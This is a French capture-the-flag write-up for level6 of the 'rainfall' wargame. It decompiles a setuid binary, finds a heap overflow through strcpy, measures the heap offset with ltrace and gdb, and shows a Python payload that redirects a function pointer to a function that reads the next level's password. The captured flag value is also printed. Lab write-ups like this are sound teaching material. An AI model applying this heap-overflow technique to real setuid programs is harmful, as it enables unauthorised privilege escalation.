Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)
/home/user/level6
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level6 :

```bash
$ ./level6
Segmentation fault (core dumped)
$ ./level6 da
Nope
```

Je recoupe l'analyse ASM du binaire avec GDB des résultats obtenus sur [Dogbolt](https://dogbolt.org/?id=bf99b17b-f29d-4c51-9cac-5055972d80ea) et en extrait une version probable du code :

```c
void n() // <-----------------------------------4 shell access
{
    system("/bin/cat /home/user/level7/.pass");
}

void m()
{
    puts("Nope");
}

int main(int argc, char **argv)
{
    int *buffer;
    void (**funcptr)(void);

    buffer = (char *)malloc(64); // <-----------1 dealing with heap here due to malloc, so we use ltrace instead of gdb
    funcptr = (void (**)(void))malloc(4);

    *funcptr = m;
    strcpy(buffer, argv[1]); // <---------------2 buffer overflows here, can be used to rewrite to what the funcptr (next to buffer in the heap) points to
    (*funcptr)(); // <--------------------------3 once corrupted, points to n() and not m() anymore
}
```

Je peux donc maintenant me concentrer sur les vulnérabilités que ce code présente. Ici, cela ressemble au premier level de `rainfall`, la particularité étant que la vulnérabilité ici semble être `strcpy()`. Ce dernier ne prend pas de taille limite, et il utilise l'argument passé au binaire pour la copie.

Je me penche donc sur ce point d'entrée possible.
Je note également qu'il n'est pas question ici de la `stack`, mais de la `heap` puisque `malloc()` est utilisé.

Etant donné que la string est alloué sur la `heap` mais également le pointeur de pointeur sur function, alors je peux exploiter une vulnérabilité donc le but serait d'overflow la `heap` afin de ré-écrire où le pointeur de pointeur sur function pointe.

Ici, il s'agirait d'overflow `string` au moment de `strcpy()` en passant un argument `argv[1]` trop grand pour `string`.
Cet overflow aura pour but de ré-écrire ce sur quoi les 4 bytes alloué au pointeur sur fonction pointeront donc désormais.

Afin de construire un payload infecté, il me faut calculer la distance entre ces deux allocations sur la `heap`. 

J'utilise `ltrace` (affiche les appels à des librairies partagées) pour simplifier ce processus :

```bash
$ ltrace ./level6 da
__libc_start_main(0x804847c, 2, 0xbffff7f4, 0x80484e0, 0x8048550 <unfinished ...>
malloc(64)                  = 0x0804a008 <-- ici
malloc(4)                   = 0x0804a050 <-- ici
strcpy(0x0804a008, "da")    = 0x0804a008
puts("Nope"Nope
)                           = 5
+++ exited (status 5) +++
```

Je peux calculer la distance : `0x0804a050 - 0x0804a008 = 0x48 = 72` bytes.

Il faut donc que mon payload remplisse le `buffer` de 64 bytes, puis 8 bytes de bruit pour atteindre 72 et que les prochaines écriture ré-écrive sur l'adresse du pointeur sur fonction.

Je cherche maintenant l'adresse de la fonction `n()` avec `gdb` :

```h
$ gdb ./level6
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp <-------------- ici
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```

L'adresse de `n()` est : `0x08048454`.

Il ne me reste donc plus qu'à construire le payload.
Ce dernier aura pour but de remplir le buffer alloué dans la `heap` pour buffer, ajouter du bruit jusqu'atteindre l'endroit dans la `heap` où est écrit l'adresse de ce sur quoi pointe le pointeur sur fonction (pour le moment `m()`) et remplacer cette dernière par l'adresse de `n()`.

De manière similaire au précedents level, voici le payload qui exploite cette vulnérabilité :

```python
python -c 'print("\x90" * 72 + "\x08\x04\x84\x54"[::-1])'
```

- Padding de 72 instructions `NOP` (no operations)
- L'adresse de `n()`

J'essaye ce payload :

```bash
$ ./level6 `python -c 'print("\x90" * 72 + "\x08\x04\x84\x54"[::-1])'`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

